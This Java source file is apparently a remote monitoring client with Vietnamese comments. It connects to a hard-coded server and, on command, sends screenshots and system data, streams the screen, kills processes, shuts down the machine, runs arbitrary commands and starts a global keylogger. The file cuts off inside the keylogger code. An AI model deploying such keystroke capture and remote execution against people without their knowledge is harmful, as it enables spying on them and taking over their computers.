import java.io.*;
import java.net.*;
import java.util.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import javax.swing.*;
import java.util.List;
import java.util.concurrent.*;
import org.json.*;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.Base64;

public class SystemMonitorClient extends JFrame {
    private static String SERVER_ADDRESS = "103.188.83.155";
    private static int SERVER_PORT = 50000;
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String clientId;
    private ScheduledExecutorService scheduler;
    private boolean keyLoggerRunning = false;
    private boolean screenStreamRunning = false;
    private StringBuilder keyLogBuffer = new StringBuilder();
    private static final int SCREENSHOT_QUALITY = 60; // Giảm từ 100 xuống 60 để nén tốt hơn
    private JLabel statusLabel;
    private boolean isConnected = false;
    private long lastServerResponse = 0;
    private JButton reconnectButton; // Thêm biến cho nút kết nối lại

    // Khai báo biến NativeKeyListener ở cấp lớp để có thể tham chiếu
    private NativeKeyListener keyListener = null;

    //Dùng System os thay cho osBean
    String os = System.getProperty("os.name").toLowerCase();

    public SystemMonitorClient() {
        clientId = generateClientId();
        scheduler = Executors.newScheduledThreadPool(1);

        // Setup GUI
        setupGUI();
        // Load file cấu hình
        loadConfig();
        // Connect to server
        connectToServer();
    }

    private static void loadConfig() {
        try {
            // Xác định đường dẫn thư mục chương trình
            String programDir = getProgramDirectory();
            File configFile = new File(programDir, "configMonitorClient.ini");

            // Nếu file không tồn tại, tạo file với giá trị mặc định
            if (!configFile.exists()) {
                try (FileWriter writer = new FileWriter(configFile)) {
                    writer.write("SERVER_ADDRESS=127.0.0.1\nSERVER_PORT=50000");
                }
                System.out.println("[*] Đã tạo file cấu hình mặc định: " + configFile.getAbsolutePath());
                return; // Sử dụng giá trị mặc định
            }

            // Đọc file cấu hình
            Properties props = new Properties();
            props.load(new FileInputStream(configFile));

            // Lấy giá trị SERVER_ADDRESS
            String address = props.getProperty("SERVER_ADDRESS");
            if (address != null && !address.trim().isEmpty()) {
                SERVER_ADDRESS = address.trim();
                System.out.println("[*] Đã đọc SERVER_ADDRESS=" + SERVER_ADDRESS + " từ file cấu hình: " + configFile.getAbsolutePath());
            }

            // Lấy giá trị SERVER_PORT
            String portStr = props.getProperty("SERVER_PORT");
            if (portStr != null && !portStr.trim().isEmpty()) {
                try {
                    SERVER_PORT = Integer.parseInt(portStr.trim());
                    System.out.println("[*] Đã đọc SERVER_PORT=" + SERVER_PORT + " từ file cấu hình: " + configFile.getAbsolutePath());
                } catch (NumberFormatException e) {
                    System.err.println("[!] Giá trị SERVER_PORT không hợp lệ trong file cấu hình. Sử dụng giá trị mặc định: " + SERVER_PORT);
                }
            }
        } catch (IOException e) {
            System.err.println("[!] Lỗi đọc file cấu hình: " + e.getMessage());
            System.out.println("[*] Sử dụng giá trị mặc định: SERVER_ADDRESS=" + SERVER_ADDRESS + ", SERVER_PORT=" + SERVER_PORT);
        }
    }

    // Phương thức xác định thư mục chứa chương trình
    private static String getProgramDirectory() {
        try {
            // Lấy đường dẫn của class hiện tại - thay tên class tương ứng cho mỗi thành phần
            String path = SystemMonitorAdminClient.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            // Giải mã URL
            path = java.net.URLDecoder.decode(path, "UTF-8");

            File jarFile = new File(path);
            if (jarFile.isFile()) {  // Nếu là file JAR
                return jarFile.getParentFile().getAbsolutePath();
            } else {  // Nếu là thư mục class
                return jarFile.getAbsolutePath();
            }
        } catch (Exception e) {
            System.err.println("[!] Không thể xác định thư mục chương trình: " + e);
            // Trả về đường dẫn hiện tại nếu có lỗi
            return System.getProperty("user.dir");
        }
    }

    private void setupGUI() {
        setTitle("System Monitor Client (User)");
        setSize(400, 300);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        JPanel panel = new JPanel(new BorderLayout());

        statusLabel = new JLabel("Đang kết nối với server...", JLabel.CENTER);
        statusLabel.setHorizontalAlignment(JLabel.CENTER);
        panel.add(statusLabel, BorderLayout.CENTER);

        JPanel buttonPanel = new JPanel();
        JButton exitButton = new JButton("Exit");
        exitButton.addActionListener(e -> shutdown());
        buttonPanel.add(exitButton);

        // Thêm nút kết nối lại
        reconnectButton = new JButton("Kết nối lại");
        reconnectButton.addActionListener(e -> reconnectToServer());
        reconnectButton.setEnabled(false); // Mặc định là disable
        buttonPanel.add(reconnectButton);

        panel.add(buttonPanel, BorderLayout.SOUTH);

        add(panel);
        setLocationRelativeTo(null);
        setVisible(true);
    }

    private String getLocalIPAddress() {
        try {
            // Get all network interfaces
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();

            // First look for a non-loopback IPv4 address
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();

                // Skip loopback, virtual or inactive interfaces
                if (networkInterface.isLoopback() || networkInterface.isVirtual() || !networkInterface.isUp()) {
                    continue;
                }

                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress address = addresses.nextElement();

                    // Prefer IPv4 addresses that are not loopback
                    if (address instanceof Inet4Address && !address.isLoopbackAddress()) {
                        return address.getHostAddress();
                    }
                }
            }

            // If no suitable IPv4 address was found, try IPv6 or any other address
            networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = networkInterfaces.nextElement();

                if (!networkInterface.isLoopback() && networkInterface.isUp()) {
                    Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress address = addresses.nextElement();
                        if (!address.isLoopbackAddress()) {
                            return address.getHostAddress();
                        }
                    }
                }
            }

            // If all else fails, return the local host address
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            // Return a default value if we can't get the IP address
            return "unknown-ip";
        }
    }

    private String getPublicIPAddress() {
        String ipAddress = "";
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ipAddress = reader.readLine();
            reader.close();
            return ipAddress;
        } catch (IOException e) {
            ipAddress = "NOPUBLICIP";
            return ipAddress;
        }
    }

    private String generateClientId() {
        try {
            String hostname = InetAddress.getLocalHost().getHostName();
            String ipAddress = getLocalIPAddress() + "-" + getPublicIPAddress();
            return hostname + "-" + ipAddress + "-" + UUID.randomUUID().toString().substring(0, 8);
        } catch (UnknownHostException e) {
            return "User-" + UUID.randomUUID().toString().substring(0, 8);
        }
    }

    private void connectToServer() {
        try {
            socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            isConnected = true;
            lastServerResponse = System.currentTimeMillis();

            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Register with server
            JSONObject registration = new JSONObject();
            registration.put("type", "user");
            registration.put("clientId", clientId);
            out.println(registration.toString());

            // Update status
            statusLabel.setText("Kết nối thành công! Đang chờ Admin...");

            // Disable reconnect button khi đã kết nối
            reconnectButton.setEnabled(false);

            // Start message handler
            new Thread(this::handleServerMessages).start();

        } catch (IOException | JSONException e) {
            System.err.println("Failed to connect to server: " + e.getMessage());
            isConnected = false;
            statusLabel.setText("Không thể kết nối đến server: " + e.getMessage());

            // Enable reconnect button khi không kết nối được
            reconnectButton.setEnabled(true);

            // Schedule reconnect attempt
            scheduler.schedule(this::reconnectToServer, 10, TimeUnit.SECONDS);
        }
    }

    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            try {
                if (socket != null && socket.isConnected() && !socket.isClosed() && isConnected) {
                    JSONObject heartbeat = new JSONObject();
                    heartbeat.put("messageType", "heartbeat");
                    heartbeat.put("clientId", clientId);
                    out.println(heartbeat.toString());
                }
            } catch (Exception e) {
                System.err.println("Error sending heartbeat: " + e.getMessage());
                if (isConnected) {
                    isConnected = false;
                    // Try to reconnect
                    reconnectToServer();
                }
            }
        }, 30, 30, TimeUnit.SECONDS);
    }

    private void startConnectionMonitor() {
        scheduler.scheduleAtFixedRate(() -> {
            // Check if we haven't heard from server for too long
            if (isConnected && System.currentTimeMillis() - lastServerResponse > 90000) { // 90 seconds
                System.err.println("No response from server for 90 seconds. Reconnecting...");
                isConnected = false;
                reconnectToServer();
            }
        }, 30, 30, TimeUnit.SECONDS);
    }

    private void reconnectToServer() {
        try {
            statusLabel.setText("Đang kết nối lại với server...");

            // Close any existing connection
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception e) {
                    // Ignore
                }
            }

            // Create new connection
            socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Register with server
            JSONObject registration = new JSONObject();
            registration.put("type", "user");
            registration.put("clientId", clientId);
            out.println(registration.toString());

            // Update status
            statusLabel.setText("Kết nối lại thành công! Đang chờ Admin...");
            isConnected = true;

            // Disable reconnect button khi đã kết nối lại
            SwingUtilities.invokeLater(() -> reconnectButton.setEnabled(false));

            // Start message handler
            new Thread(this::handleServerMessages).start();

        } catch (Exception e) {
            System.err.println("Failed to reconnect: " + e.getMessage());
            statusLabel.setText("Không thể kết nối lại: " + e.getMessage());

            // Enable reconnect button khi không thể kết nối lại
            SwingUtilities.invokeLater(() -> reconnectButton.setEnabled(true));

            // Schedule another attempt
            scheduler.schedule(this::reconnectToServer, 10, TimeUnit.SECONDS);
        }
    }

    private void handleServerMessages() {
        try {
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                processMessage(inputLine);
            }
        } catch (IOException e) {
            System.err.println("Connection lost: " + e.getMessage());
            isConnected = false;
            statusLabel.setText("Mất kết nối với server: " + e.getMessage());

            // Enable reconnect button khi mất kết nối
            SwingUtilities.invokeLater(() -> reconnectButton.setEnabled(true));

            // Try to reconnect
            reconnectToServer();
        }
    }

    private void processMessage(String message) {
        try {
            JSONObject json = new JSONObject(message);
            String messageType = json.getString("messageType");

            // If this is the first message from admin, update status
            statusLabel.setText("Đang kết nối với Admin");

            String adminId = json.getString("adminId");

            switch (messageType) {
                case "requestSystemInfo":
                    sendSystemInfo(adminId);
                    break;
                case "requestScreenshot":
                    sendScreenshot(adminId);
                    break;
                case "requestProcessList":
                    sendProcessList(adminId);
                    break;
                case "killProcess":
                    killProcess(json.getInt("pid"), adminId);
                    break;
                case "shutdownUser":
                    shutdownComputer();
                    break;
                case "logoutUser":
                    logoutUser();
                    break;
                case "startKeyLogger":
                    startKeyLogger(adminId);
                    break;
                case "stopKeyLogger":
                    stopKeyLogger();
                    break;
                case "startScreenStream":
                    startScreenStream(adminId);
                    break;
                case "stopScreenStream":
                    stopScreenStream();
                    break;
                case "executeCommand":
                    executeCommand(json.getString("command"), adminId);
                    break;
                case "serverShutdown":
                    isConnected = false;
                    statusLabel.setText("Server đã đóng kết nối. Đang kết nối lại...");
                    // Enable reconnect button khi server shutdown
                    SwingUtilities.invokeLater(() -> reconnectButton.setEnabled(true));
                    reconnectToServer();
                    break;
            }
        } catch (JSONException e) {
            System.err.println("Error processing message: " + e.getMessage());
        }
    }

    private void sendSystemInfo(String adminId) {
        try {
            JSONObject systemData = new JSONObject();
            systemData.put("messageType", "systemInfoResponse");
            systemData.put("targetAdminId", adminId);
            systemData.put("sourceUserId", clientId);

            // OS info
            systemData.put("osName", System.getProperty("os.name"));
            systemData.put("osVersion", System.getProperty("os.version"));

            // CPU info
            int availableProcessors = Runtime.getRuntime().availableProcessors();
            systemData.put("cpuCores", availableProcessors);

            // Get CPU model and load
            String cpuModel = "Unknown";
            String cpuLoadStr = "0.0";
            try {
                String cpuCommand = "";
                if (os.contains("win")) {
                    cpuCommand = "wmic cpu get Name, LoadPercentage /value";
                } else if (os.contains("linux") || os.contains("unix")) {
                    cpuCommand = "cat /proc/cpuinfo | grep 'model name' | head -1";
                } else if (os.contains("mac")) {
                    cpuCommand = "sysctl -n machdep.cpu.brand_string";
                }

                Process cpuProcess = Runtime.getRuntime().exec(cpuCommand);
                BufferedReader cpuReader = new BufferedReader(new InputStreamReader(cpuProcess.getInputStream()));
                String line;
                StringBuilder cpuOutput = new StringBuilder();

                while ((line = cpuReader.readLine()) != null) {
                    cpuOutput.append(line).append("\n");
                    if (os.contains("win") && line.contains("Name=")) {
                        cpuModel = line.split("=")[1].trim();
                    } else if (os.contains("win") && line.contains("LoadPercentage=")) {
                        cpuLoadStr = line.split("=")[1].trim();
                    } else if ((os.contains("linux") || os.contains("unix")) && line.contains("model name")) {
                        cpuModel = line.split(":")[1].trim();
                    } else if (os.contains("mac")) {
                        cpuModel = line.trim();
                    }
                }
                cpuProcess.waitFor();
                cpuReader.close();

                // If we couldn't get CPU load from WMI, try alternative method
                if (os.contains("win") && cpuLoadStr.equals("0.0")) {
                    Process loadProcess = Runtime.getRuntime().exec("wmic cpu get LoadPercentage /value");
                    BufferedReader loadReader = new BufferedReader(new InputStreamReader(loadProcess.getInputStream()));
                    String loadLine;
                    while ((loadLine = loadReader.readLine()) != null) {
                        if (loadLine.contains("LoadPercentage=")) {
                            cpuLoadStr = loadLine.split("=")[1].trim();
                            break;
                        }
                    }
                    loadProcess.waitFor();
                    loadReader.close();
                } else if (os.contains("linux") || os.contains("unix")) {
                    // Get CPU load on Linux using 'top' command
                    Process loadProcess = Runtime.getRuntime().exec(new String[]{"bash", "-c", "top -bn1 | grep '%Cpu' | awk '{print $2+$4}'"});
                    BufferedReader loadReader = new BufferedReader(new InputStreamReader(loadProcess.getInputStream()));
                    String loadLine = loadReader.readLine();
                    if (loadLine != null && !loadLine.trim().isEmpty()) {
                        cpuLoadStr = loadLine.trim();
                    }
                    loadProcess.waitFor();
                    loadReader.close();
                } else if (os.contains("mac")) {
                    // Get CPU load on Mac
                    Process loadProcess = Runtime.getRuntime().exec(new String[]{"bash", "-c", "top -l 1 | grep 'CPU usage' | awk '{print $3}' | cut -d% -f1"});
                    BufferedReader loadReader = new BufferedReader(new InputStreamReader(loadProcess.getInputStream()));
                    String loadLine = loadReader.readLine();
                    if (loadLine != null && !loadLine.trim().isEmpty()) {
                        cpuLoadStr = loadLine.trim();
                    }
                    loadProcess.waitFor();
                    loadReader.close();
                }
            } catch (Exception e) {
                System.err.println("Error getting CPU info: " + e.getMessage());
            }

            systemData.put("cpuModel", cpuModel);

            try {
                double cpuLoad = Double.parseDouble(cpuLoadStr);
                systemData.put("cpuLoad", String.format("%.2f", cpuLoad));
            } catch (NumberFormatException e) {
                systemData.put("cpuLoad", "0.00");
            }

            // Memory info
            String totalMemory = "Unknown";
            String usedMemory = "Unknown";
            String memoryPercentage = "0.00";

            try {
                String memCommand = "";
                if (os.contains("win")) {
                    memCommand = "wmic OS get TotalVisibleMemorySize, FreePhysicalMemory /Value";
                } else if (os.contains("linux") || os.contains("unix")) {
                    memCommand = "free -m";
                } else if (os.contains("mac")) {
                    memCommand = "vm_stat";
                }

                Process memProcess = Runtime.getRuntime().exec(memCommand);
                BufferedReader memReader = new BufferedReader(new InputStreamReader(memProcess.getInputStream()));
                String line;
                long totalMemBytes = 0;
                long freeMemBytes = 0;

                while ((line = memReader.readLine()) != null) {
                    if (os.contains("win")) {
                        if (line.contains("TotalVisibleMemorySize=")) {
                            totalMemBytes = Long.parseLong(line.split("=")[1].trim()) * 1024; // Convert KB to bytes
                        } else if (line.contains("FreePhysicalMemory=")) {
                            freeMemBytes = Long.parseLong(line.split("=")[1].trim()) * 1024; // Convert KB to bytes
                        }
                    } else if (os.contains("linux") || os.contains("unix") && line.startsWith("Mem:")) {
                        String[] parts = line.split("\\s+");
                        totalMemBytes = Long.parseLong(parts[1]) * 1024 * 1024; // Convert MB to bytes
                        long usedMemBytes = Long.parseLong(parts[2]) * 1024 * 1024; // Convert MB to bytes
                        freeMemBytes = totalMemBytes - usedMemBytes;
                    } else if (os.contains("mac")) {
                        // Process vm_stat output for Mac
                        if (line.contains("Pages free:")) {
                            long freePages = Long.parseLong(line.trim().split("\\s+")[2].replace(".", ""));
                            freeMemBytes += freePages * 4096; // Page size is typically 4KB
                        }
                        // Additional processing for Mac would be needed here
                    }
                }

                memProcess.waitFor();
                memReader.close();

                if (totalMemBytes > 0) {
                    totalMemory = formatBytes(totalMemBytes) + " - " + totalMemBytes;
                    long usedMemBytes = totalMemBytes - freeMemBytes;
                    usedMemory = formatBytes(usedMemBytes) + " - " + usedMemBytes;
                    memoryPercentage = String.format("%.1f", ((double) usedMemBytes / totalMemBytes) * 100);
                }

            } catch (Exception e) {
                System.err.println("Error getting memory info: " + e.getMessage());
            }

            systemData.put("totalMemory", totalMemory);
            systemData.put("usedMemory", usedMemory);
            systemData.put("memoryUsage", memoryPercentage);


            // Disk info
            JSONArray disksInfo = new JSONArray();
            File[] roots = File.listRoots();
            for (File root : roots) {
                JSONObject diskInfo = new JSONObject();
                diskInfo.put("name", root.getAbsolutePath());
                diskInfo.put("size", formatBytes(root.getTotalSpace()) + " - " + root.getTotalSpace());
                diskInfo.put("free", formatBytes(root.getFreeSpace()) + " - " + root.getFreeSpace());
                disksInfo.put(diskInfo);
            }
            systemData.put("disks", disksInfo);

            // Send to server
            out.println(systemData.toString());
        } catch (Exception e) {
            System.err.println("Error getting system info: " + e.getMessage());
        }
    }

    private void sendScreenshot(String adminId) {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenImage = robot.createScreenCapture(screenRect);

            // Compress and convert to Base64
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(compressImage(screenImage, SCREENSHOT_QUALITY), "jpg", baos);
            String base64Image = Base64.getEncoder().encodeToString(baos.toByteArray());

            JSONObject response = new JSONObject();
            response.put("messageType", "screenshotResponse");
            response.put("targetAdminId", adminId);
            response.put("sourceUserId", clientId);
            response.put("imageData", base64Image);
            response.put("timestamp", System.currentTimeMillis());
            response.put("width", screenImage.getWidth());
            response.put("height", screenImage.getHeight());

            out.println(response.toString());
        } catch (Exception e) {
            System.err.println("Error capturing screenshot: " + e.getMessage());
        }
    }

    private BufferedImage compressImage(BufferedImage image, int quality) {
        // Scale down the image if it's very large
        int maxDimension = 1280; // Max width or height
        int width = image.getWidth();
        int height = image.getHeight();

        if (width > maxDimension || height > maxDimension) {
            double scale = (double) maxDimension / Math.max(width, height);
            int newWidth = (int) (width * scale);
            int newHeight = (int) (height * scale);

            BufferedImage scaledImage = new BufferedImage(newWidth, newHeight, BufferedImage.TYPE_INT_RGB);
            Graphics2D g = scaledImage.createGraphics();
            g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
            g.drawImage(image, 0, 0, newWidth, newHeight, null);
            g.dispose();

            return scaledImage;
        }

        return image;
    }

    private void sendProcessList(String adminId) {
        try {
            // Xác định hệ điều hành
            boolean isWindows = System.getProperty("os.name").toLowerCase().contains("windows");

            // Thu thập thông tin CPU và RAM cho các tiến trình sử dụng lệnh hệ thống
            Map<Long, String> cpuUsageMap = new HashMap<>();
            Map<Long, String> memoryUsageMap = new HashMap<>();
            Map<Long, String> priorityMap = new HashMap<>();

            // Lấy thông tin từ các lệnh hệ thống
            if (isWindows) {
                // Windows: Sử dụng WMIC để lấy thông tin
                // CPU usage
                getWindowsCpuUsage(cpuUsageMap);

                // Memory usage
                getWindowsMemoryUsage(memoryUsageMap);

                // Priority
                getWindowsPriority(priorityMap);
            }
            // Tạo JSON response
            JSONObject response = new JSONObject();
            response.put("messageType", "processListResponse");
            response.put("targetAdminId", adminId);
            response.put("sourceUserId", clientId);

            JSONArray processArray = new JSONArray();

            // Lấy tất cả các tiến trình bằng Java ProcessHandle API
            ProcessHandle.allProcesses().forEach(process -> {
                try {
                    ProcessHandle.Info info = process.info();
                    if (!process.isAlive()) return;

                    JSONObject processInfo = new JSONObject();
                    long pid = process.pid();
                    processInfo.put("pid", pid);

                    // Tên tiến trình
                    info.command().ifPresent(cmd -> {
                        try {
                            String[] parts = cmd.split("[\\\\/]");
                            processInfo.put("name", parts[parts.length - 1]);
                        } catch (Exception e) {
                            try {
                                processInfo.put("name", cmd);
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                        }
                    });

                    if (!processInfo.has("name")) {
                        processInfo.put("name", "Process " + pid);
                    }

                    // CPU usage từ map đã thu thập
                    processInfo.put("cpuUsage", cpuUsageMap.getOrDefault(pid, "0.0%"));

                    // Memory usage từ map đã thu thập
                    processInfo.put("memoryUsage", memoryUsageMap.getOrDefault(pid, "0.0MB"));

                    // User
                    info.user().ifPresent(user -> {
                        try {
                            processInfo.put("user", user);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    });

                    if (!processInfo.has("user")) {
                        processInfo.put("user", System.getProperty("user.name"));
                    }

                    // Priority từ map đã thu thập
                    processInfo.put("priority", priorityMap.getOrDefault(pid, "Normal"));

                    // Thời gian bắt đầu
                    info.startInstant().ifPresent(start -> {
                        try {
                            processInfo.put("startTime", start.toEpochMilli());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    });

                    if (!processInfo.has("startTime")) {
                        processInfo.put("startTime", 0);
                    }

                    processArray.put(processInfo);
                } catch (Exception e) {
                    // Bỏ qua tiến trình này nếu có lỗi
                }
            });

            response.put("processes", processArray);
            out.println(response.toString());
        } catch (Exception e) {
            System.err.println("Error getting process list: " + e.getMessage());
            e.printStackTrace();

            try {
                // Gửi phản hồi lỗi
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("messageType", "processListResponse");
                errorResponse.put("targetAdminId", adminId);
                errorResponse.put("sourceUserId", clientId);
                errorResponse.put("error", "Failed to collect process information: " + e.getMessage());

                out.println(errorResponse.toString());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
    }

    // Lấy thông tin CPU usage trên Windows
    private void getWindowsCpuUsage(Map<Long, String> cpuUsageMap) {
        try {
            ProcessBuilder pb = new ProcessBuilder("wmic", "path", "Win32_PerfFormattedData_PerfProc_Process",
                    "get", "IDProcess,PercentProcessorTime", "/format:csv");
            Process p = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                boolean isFirstLine = true;

                while ((line = reader.readLine()) != null) {
                    if (line.trim().isEmpty() || (isFirstLine && line.contains("Node"))) {
                        isFirstLine = false;
                        continue;
                    }

                    String[] parts = line.split(",");
                    if (parts.length >= 3) {
                        try {
                            // Format: Node,IDProcess,PercentProcessorTime
                            long pid = Long.parseLong(parts[1].trim());
                            double cpuPercent = Double.parseDouble(parts[2].trim());

                            // Giới hạn giá trị tối đa là 100%
                            cpuPercent = Math.min(cpuPercent, 100.0);

                            cpuUsageMap.put(pid, String.format("%.1f%%", cpuPercent));
                        } catch (NumberFormatException e) {
                            // Bỏ qua nếu không thể phân tích số
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("Error getting CPU usage: " + e.getMessage());
        }
    }

    // Lấy thông tin Memory usage trên Windows
    private void getWindowsMemoryUsage(Map<Long, String> memoryUsageMap) {
        try {
            ProcessBuilder pb = new ProcessBuilder("wmic", "process", "get", "ProcessId,WorkingSetSize", "/format:csv");
            Process p = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                boolean isFirstLine = true;

                while ((line = reader.readLine()) != null) {
                    if (line.trim().isEmpty() || (isFirstLine && line.contains("Node"))) {
                        isFirstLine = false;
                        continue;
                    }

                    String[] parts = line.split(",");
                    if (parts.length >= 3) {
                        try {
                            // Format: Node,ProcessId,WorkingSetSize
                            long pid = Long.parseLong(parts[1].trim());
                            long memoryBytes = Long.parseLong(parts[2].trim());
                            double memoryMB = memoryBytes / (1024.0 * 1024.0);

                            memoryUsageMap.put(pid, String.format("%.1f MB", memoryMB));
                        } catch (NumberFormatException e) {
                            // Bỏ qua nếu không thể phân tích số
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("Error getting memory usage: " + e.getMessage());
        }
    }

    // Lấy thông tin Priority trên Windows
    private void getWindowsPriority(Map<Long, String> priorityMap) {
        try {
            ProcessBuilder pb = new ProcessBuilder("wmic", "process", "get", "ProcessId,Priority", "/format:csv");
            Process p = pb.start();

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                boolean isFirstLine = true;

                while ((line = reader.readLine()) != null) {
                    if (line.trim().isEmpty() || (isFirstLine && line.contains("Node"))) {
                        isFirstLine = false;
                        continue;
                    }

                    String[] parts = line.split(",");
                    if (parts.length >= 3) {
                        try {
                            // Format: Node,ProcessId,Priority
                            long pid = Long.parseLong(parts[1].trim());
                            int priority = Integer.parseInt(parts[2].trim());

                            String priorityStr;
                            switch (priority) {
                                case 4: priorityStr = "Idle"; break;
                                case 6: priorityStr = "Below Normal"; break;
                                case 8: priorityStr = "Normal"; break;
                                case 10: priorityStr = "Above Normal"; break;
                                case 13: priorityStr = "High"; break;
                                case 24: priorityStr = "Real-time"; break;
                                default: priorityStr = String.valueOf(priority);
                            }

                            priorityMap.put(pid, priorityStr);
                        } catch (NumberFormatException e) {
                            // Bỏ qua nếu không thể phân tích số
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("Error getting process priorities: " + e.getMessage());
        }
    }

    private void sendProcessListNoUsage(String adminId) {
        try {
            // Get process information using ProcessHandle (Java 9+)
            JSONObject response = new JSONObject();
            response.put("messageType", "processListResponse");
            response.put("targetAdminId", adminId);
            response.put("sourceUserId", clientId);

            JSONArray processArray = new JSONArray();

            ProcessHandle.allProcesses().forEach(process -> {
                try {
                    ProcessHandle.Info info = process.info();
                    if (!process.isAlive()) return;

                    JSONObject processInfo = new JSONObject();
                    processInfo.put("pid", process.pid());

                    info.command().ifPresent(cmd -> {
                        try {
                            String[] parts = cmd.split("[\\\\/]");
                            processInfo.put("name", parts[parts.length - 1]);
                        } catch (Exception e) {
                            try {
                                processInfo.put("name", cmd);
                            } catch (JSONException ex) {
                                ex.printStackTrace();
                            }
                        }
                    });

                    if (!processInfo.has("name")) {
                        try {
                            processInfo.put("name", "Process " + process.pid());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    // CPU usage is not directly available in Java without external libraries
                    processInfo.put("cpuUsage", "N/A");

                    // Memory not directly available per process in Java
                    processInfo.put("memoryUsage", "N/A");

                    info.user().ifPresent(user -> {
                        try {
                            processInfo.put("user", user);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    });

                    if (!processInfo.has("user")) {
                        try {
                            processInfo.put("user", "N/A");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    processInfo.put("priority", "N/A");

                    info.startInstant().ifPresent(start -> {
                        try {
                            processInfo.put("startTime", start.toEpochMilli());
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    });

                    if (!processInfo.has("startTime")) {
                        try {
                            processInfo.put("startTime", 0);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }

                    processArray.put(processInfo);
                } catch (Exception e) {
                    // Skip this process if there's an error
                }
            });

            response.put("processes", processArray);
            out.println(response.toString());
        } catch (Exception e) {
            System.err.println("Error getting process list: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void killProcess(int pid, String adminId) {
        try {
            boolean success = ProcessHandle.of(pid)
                    .map(ProcessHandle::destroyForcibly)
                    .orElse(false);

            JSONObject response = new JSONObject();
            response.put("messageType", "commandResponse");
            response.put("targetAdminId", adminId);
            response.put("sourceUserId", clientId);
            response.put("command", "killProcess");
            response.put("pid", pid);
            response.put("success", success);

            out.println(response.toString());
        } catch (Exception e) {
            System.err.println("Error killing process: " + e.getMessage());
        }
    }

    private void shutdownComputer() {
        try {
            // Thông báo cho người dùng
            JOptionPane.showMessageDialog(this,
                    "Máy tính của bạn sẽ tắt trong 10 giây.",
                    "Thông báo tắt máy", JOptionPane.WARNING_MESSAGE);

            if (os.contains("win")) {
                Runtime.getRuntime().exec("shutdown -s -t 10");
            } else if (os.contains("linux") || os.contains("unix")) {
                Runtime.getRuntime().exec("shutdown -h +1");
            } else if (os.contains("mac")) {
                Runtime.getRuntime().exec("shutdown -h +1");
            }
        } catch (IOException e) {
            System.err.println("Error shutting down computer: " + e.getMessage());
        }
    }

    private void logoutUser() {
        try {
            // Thông báo cho người dùng
            JOptionPane.showMessageDialog(this,
                    "Bạn sắp bị đăng xuất khỏi hệ thống.",
                    "Thông báo đăng xuất", JOptionPane.WARNING_MESSAGE);

            if (os.contains("win")) {
                Runtime.getRuntime().exec("shutdown -l");
            } else if (os.contains("linux") || os.contains("unix")) {
                // For Linux/Mac, might need different commands
                Runtime.getRuntime().exec("pkill -KILL -u " + System.getProperty("user.name"));
            } else if (os.contains("mac")) {
                Runtime.getRuntime().exec("launchctl bootout user/" + System.getProperty("user.name"));
            }
        } catch (IOException e) {
            System.err.println("Error logging out user: " + e.getMessage());
        }
    }

    private void startKeyLogger(String adminId) {
        if (keyLoggerRunning) return;

        try {
            // Disable JNativeHook logging
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);

            // Kiểm tra nếu GlobalScreen đã đăng ký
            if (!GlobalScreen.isNativeHookRegistered()) {
                // Đăng ký native hook
                GlobalScreen.registerNativeHook();
            }

            // Tạo mới key listener mỗi khi bắt đầu
            keyListener = new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
